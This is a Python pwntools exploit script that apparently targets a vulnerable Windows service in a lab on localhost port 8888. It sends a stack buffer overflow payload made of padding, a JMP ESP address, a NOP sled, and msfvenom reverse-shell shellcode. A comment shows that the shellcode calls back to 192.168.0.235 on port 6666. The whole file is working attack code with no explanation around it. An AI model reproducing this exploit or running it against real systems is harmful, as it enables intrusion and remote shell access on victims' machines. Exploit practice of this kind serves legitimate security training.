from pwn import *

host = '127.0.0.1'
port = 8888

badchars = b'\x00\x0a'
chars = bytes([i for i in range(0x100)])
chars = chars.translate(None,badchars)

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.235 LPORT=6666 EXITFUNC=thread -b "\x00\x0a" -f python -v shellcode
shellcode =  b""
shellcode += b"\xbf\x8a\xda\x6e\xe9\xda\xcc\xd9\x74\x24\xf4"
shellcode += b"\x58\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x78\x0e"
shellcode += b"\x03\xf2\xd4\x8c\x1c\xfe\x01\xd2\xdf\xfe\xd1"
shellcode += b"\xb3\x56\x1b\xe0\xf3\x0d\x68\x53\xc4\x46\x3c"
shellcode += b"\x58\xaf\x0b\xd4\xeb\xdd\x83\xdb\x5c\x6b\xf2"
shellcode += b"\xd2\x5d\xc0\xc6\x75\xde\x1b\x1b\x55\xdf\xd3"
shellcode += b"\x6e\x94\x18\x09\x82\xc4\xf1\x45\x31\xf8\x76"
shellcode += b"\x13\x8a\x73\xc4\xb5\x8a\x60\x9d\xb4\xbb\x37"
shellcode += b"\x95\xee\x1b\xb6\x7a\x9b\x15\xa0\x9f\xa6\xec"
shellcode += b"\x5b\x6b\x5c\xef\x8d\xa5\x9d\x5c\xf0\x09\x6c"
shellcode += b"\x9c\x35\xad\x8f\xeb\x4f\xcd\x32\xec\x94\xaf"
shellcode += b"\xe8\x79\x0e\x17\x7a\xd9\xea\xa9\xaf\xbc\x79"
shellcode += b"\xa5\x04\xca\x25\xaa\x9b\x1f\x5e\xd6\x10\x9e"
shellcode += b"\xb0\x5e\x62\x85\x14\x3a\x30\xa4\x0d\xe6\x97"
shellcode += b"\xd9\x4d\x49\x47\x7c\x06\x64\x9c\x0d\x45\xe1"
shellcode += b"\x51\x3c\x75\xf1\xfd\x37\x06\xc3\xa2\xe3\x80"
shellcode += b"\x6f\x2a\x2a\x57\x8f\x01\x8a\xc7\x6e\xaa\xeb"
shellcode += b"\xce\xb4\xfe\xbb\x78\x1c\x7f\x50\x78\xa1\xaa"
shellcode += b"\xf7\x28\x0d\x05\xb8\x98\xed\xf5\x50\xf2\xe1"
shellcode += b"\x2a\x40\xfd\x2b\x43\xeb\x04\xbc\xac\x44\x06"
shellcode += b"\xd7\x45\x97\x06\x3d\x9c\x1e\xe0\x2b\xb0\x76"
shellcode += b"\xbb\xc3\x29\xd3\x37\x75\xb5\xc9\x32\xb5\x3d"
shellcode += b"\xfe\xc3\x78\xb6\x8b\xd7\xed\x36\xc6\x85\xb8"
shellcode += b"\x49\xfc\xa1\x27\xdb\x9b\x31\x21\xc0\x33\x66"
shellcode += b"\x66\x36\x4a\xe2\x9a\x61\xe4\x10\x67\xf7\xcf"
shellcode += b"\x90\xbc\xc4\xce\x19\x30\x70\xf5\x09\x8c\x79"
shellcode += b"\xb1\x7d\x40\x2c\x6f\x2b\x26\x86\xc1\x85\xf0"
shellcode += b"\x75\x88\x41\x84\xb5\x0b\x17\x89\x93\xfd\xf7"
shellcode += b"\x38\x4a\xb8\x08\xf4\x1a\x4c\x71\xe8\xba\xb3"
shellcode += b"\xa8\xa8\xdb\x51\x78\xc5\x73\xcc\xe9\x64\x1e"
shellcode += b"\xef\xc4\xab\x27\x6c\xec\x53\xdc\x6c\x85\x56"
shellcode += b"\x98\x2a\x76\x2b\xb1\xde\x78\x98\xb2\xca"


io = remote(host,port)

jmp_esp = 0x6206b8ff
buf = b'A'*1052
buf += p32(jmp_esp)
# buf += b'\xcc'*4
# buf += chars
buf += b'\x90'*20
# buf += b'\xcc'*4
buf += shellcode
buf += b'C'*(5000-len(buf))

io.send(buf)

